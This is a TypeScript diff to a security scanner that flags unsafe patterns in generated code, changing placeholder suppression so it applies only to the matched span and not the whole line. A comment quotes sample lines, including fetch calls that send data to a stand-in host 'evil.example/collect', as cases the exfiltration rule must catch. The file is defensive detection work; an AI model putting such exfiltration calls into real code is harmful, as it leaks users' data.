@@ -118,12 +118,43 @@ const RULES: readonly Rule[] = [
 ];
 
 /**
+ * The codes above, as data.
+ *
+ * Exported so a caller narrowing the gate to one boundary can be *checked* against the set
+ * that exists rather than trusted to spell it. Derived from `RULES` so a new rule is
+ * accepted by `--expect` the moment it is added, with nothing to keep in sync.
+ */
+export const SAFETY_VIOLATION_CODES: readonly SafetyViolationCode[] = RULES.map(rule => rule.code);
+
+/**
  * Placeholders that look like secrets and are the *correct* answer.
  *
- * Checked before the rules rather than woven into them, because a rule that has to encode
- * its own exceptions stops being readable. `@Microsoft.KeyVault(...)` is what a compliant
- * app settings file contains, and flagging it would punish exactly the behaviour the
- * guardrail asks for.
+ * Checked separately from the rules rather than woven into them, because a rule that has to
+ * encode its own exceptions stops being readable. `@Microsoft.KeyVault(...)` is what a
+ * compliant app settings file contains, and flagging it would punish exactly the behaviour
+ * the guardrail asks for.
+ *
+ * ── Suppression is scoped to the matched span, never the whole line ──────────────────
+ *
+ * Testing the line and skipping it turned every entry here into an off switch for all six
+ * rules at once, and two of these patterns match text with nothing to do with the violation
+ * sitting beside it: `\$\{[^}]+\}` is *any* JavaScript template interpolation, and
+ * `\bxxx+\b` is *any* comment containing "xxx". Measured against this scanner:
+ *
+ *     fetch("https://evil.example/collect")                  ->  exfiltrationEndpoint
+ *     fetch(`https://evil.example/collect?id=${id}`)         ->  (nothing)
+ *     { "allowBlobPublicAccess": true }                      ->  publicAnonymousAccess
+ *     { "allowBlobPublicAccess": true, "name": "${p}sa" }    ->  (nothing)
+ *     roleDefinitionName: 'Owner' // xxx follow up           ->  (nothing)
+ *
+ * A template literal is the ordinary way generated JavaScript builds a URL, so the line
+ * shape the exfiltration rule is most likely to meet was the one shape it could not see —
+ * a false green on the suite's headline check, which is the direction this file's own
+ * header calls the dangerous one.
+ *
+ * Overlap keeps every legitimate case, because in all of them the placeholder *is* the
+ * value the rule matched: `api_key: "xxxxxxxx…"`, `AccountKey=${STORAGE_KEY}`,
+ * `client_secret: "<YOUR_SECRET>"`.
  */
 const ALLOWED_PLACEHOLDERS = [
     /@Microsoft\.KeyVault\(/i,
@@ -133,6 +164,63 @@ const ALLOWED_PLACEHOLDERS = [
     /\bREPLACE[-_]ME\b/i,
     /\bxxx+\b/i,
 ];
+
+/**
+ * Global twins of the placeholders and of every rule, so a match's *position* can be read.
+ *
+ * `exec` on a non-global regex always reports the first match and cannot enumerate, which is
+ * why the original could only ask "does this line contain a placeholder" and never "does that
+ * placeholder overlap this violation". Built once; a global regex carries `lastIndex`, so
+ * each is reset before use rather than shared mid-scan.
+ */
+const PLACEHOLDER_SCANNERS = ALLOWED_PLACEHOLDERS.map(toScanner);
+const RULE_SCANNERS = RULES.map(rule => ({ rule, scanner: toScanner(rule.pattern) }));
+
+function toScanner(pattern: RegExp): RegExp {
+    return new RegExp(pattern.source, `${pattern.flags.replace('g', '')}g`);
+}
+
+/** Half-open `[start, end)` character range. */
+type Span = readonly [start: number, end: number];
+
+/** Every allowed-placeholder span on a line. */
+function placeholderSpans(line: string): Span[] {
+    const spans: Span[] = [];
+    for (const scanner of PLACEHOLDER_SCANNERS) {
+        scanner.lastIndex = 0;
+        for (let match = scanner.exec(line); match; match = scanner.exec(line)) {
+            spans.push([match.index, match.index + match[0].length]);
+            if (match[0].length === 0) {
+                scanner.lastIndex++;
+            }
+        }
+    }
+    return spans;
+}
+
+/**
+ * The first match of `scanner` on `line` that no placeholder overlaps.
+ *
+ * Keeps scanning past a suppressed hit rather than giving up on it, so a line carrying both
+ * a placeholder and a real violation still reports the violation. Returns at most one match
+ * per rule per line, which is the shape the certified path already expects.
+ */
+function firstUnsuppressedMatch(line: string, scanner: RegExp, spans: readonly Span[]): RegExpExecArray | undefined {
+    scanner.lastIndex = 0;
+    for (let match = scanner.exec(line); match; match = scanner.exec(line)) {
+        const start = match.index;
+        const end = start + match[0].length;
+        if (!spans.some(([from, to]) => from < end && start < to)) {
+            return match;
+        }
+        // No rule can match empty today, but a zero-length match would not advance
+        // `lastIndex` and would spin here, and the loop should not depend on that holding.
+        if (match[0].length === 0) {
+            scanner.lastIndex++;
+        }
+    }
+    return undefined;
+}
 
 export interface SafetyScanResult {
     readonly violations: readonly SafetyViolation[];
@@ -163,11 +251,9 @@ export function scanForSafetyViolations(workspaceRoot: string): SafetyScanResult
         const lines = text.split('\n');
         for (let index = 0; index < lines.length; index++) {
             const line = lines[index];
-            if (ALLOWED_PLACEHOLDERS.some(placeholder => placeholder.test(line))) {
-                continue;
-            }
-            for (const rule of RULES) {
-                const match = rule.pattern.exec(line);
+            const spans = placeholderSpans(line);
+            for (const { rule, scanner } of RULE_SCANNERS) {
+                const match = firstUnsuppressedMatch(line, scanner, spans);
                 if (match) {
                     violations.push({
                         code: rule.code,
